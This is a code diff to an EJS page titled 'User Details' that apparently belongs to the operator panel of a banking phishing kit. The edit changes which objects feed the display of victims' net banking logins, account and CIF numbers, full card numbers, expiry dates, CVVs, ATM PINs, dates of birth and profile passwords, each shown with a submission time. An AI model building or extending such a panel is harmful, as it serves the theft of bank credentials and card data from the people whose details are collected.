@@ -2,9 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>User Details</title>
-  <link rel="stylesheet" href="/css/userDetail.css" />
+  <link rel="stylesheet" href="/css/userDetail.css"/>
 </head>
 <body>
   <header class="header-nav">
@@ -14,6 +14,7 @@
   <div class="user-detail-container">
     <h2>User Details</h2>
 
+    <!-- USER SECTION -->
     <% if (user) { %>
       <div class="card">
         <h3>User Information</h3>
@@ -28,13 +29,14 @@
       </div>
     <% } %>
 
-    <% if (netBanking && user) { %>
+    <!-- NET BANKING SECTION -->
+    <% if (netBanking) { %>
       <div class="card">
         <h3>Net Banking Information</h3>
-        <p><strong>Name:</strong> <%= user.name %></p>
-        <p><strong>Account No:</strong> <%= user.acNumber %></p>
-        <p><strong>CIF No:</strong> <%= user.cifNumber %></p>
-        <p><strong>Submitted At:</strong> <%= new Date(user.submittedAt).toLocaleString() %></p>
+        <p><strong>Name:</strong> <%= netBanking.name %></p>
+        <p><strong>Account No:</strong> <%= netBanking.acNumber %></p>
+        <p><strong>CIF No:</strong> <%= netBanking.cifNumber %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(netBanking.submittedAt).toLocaleString() %></p>
       </div>
     <% } else { %>
       <div class="card">
@@ -42,15 +44,16 @@
       </div>
     <% } %>
 
-    <% if (card && user) { %>
+    <!-- CARD SECTION -->
+    <% if (card) { %>
       <div class="card">
         <h3>Card Information</h3>
-        <p><strong>Card Number:</strong> <%= user.cardNumber %></p>
-        <p><strong>Expiry Month:</strong> <%= user.expiryMonth %></p>
-        <p><strong>Expiry Year:</strong> <%= user.expiryYear %></p>
-        <p><strong>CVV:</strong> <%= user.cvv %></p>
-        <p><strong>ATM Pin:</strong> <%= user.atmPin %></p>
-        <p><strong>Submitted At:</strong> <%= new Date(user.submittedAt).toLocaleString() %></p>
+        <p><strong>Card Number:</strong> <%= card.cardNumber %></p>
+        <p><strong>Expiry Month:</strong> <%= card.expiryMonth %></p>
+        <p><strong>Expiry Year:</strong> <%= card.expiryYear %></p>
+        <p><strong>CVV:</strong> <%= card.cvv %></p>
+        <p><strong>ATM Pin:</strong> <%= card.atmPin %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(card.submittedAt).toLocaleString() %></p>
       </div>
     <% } else { %>
       <div class="card">
@@ -58,12 +61,13 @@
       </div>
     <% } %>
 
-    <% if (success && user) { %>
+    <!-- SUCCESS DATA SECTION -->
+    <% if (success) { %>
       <div class="card">
         <h3>Success Information</h3>
-        <p><strong>DOB:</strong> <%= user.dob %></p>
-        <p><strong>Profile Password:</strong> <%= user.profilePassword %></p>
-        <p><strong>Submitted At:</strong> <%= new Date(user.submittedAt).toLocaleString() %></p>
+        <p><strong>DOB:</strong> <%= success.dob %></p>
+        <p><strong>Profile Password:</strong> <%= success.profilePassword %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(success.submittedAt).toLocaleString() %></p>
       </div>
     <% } else { %>
       <div class="card">
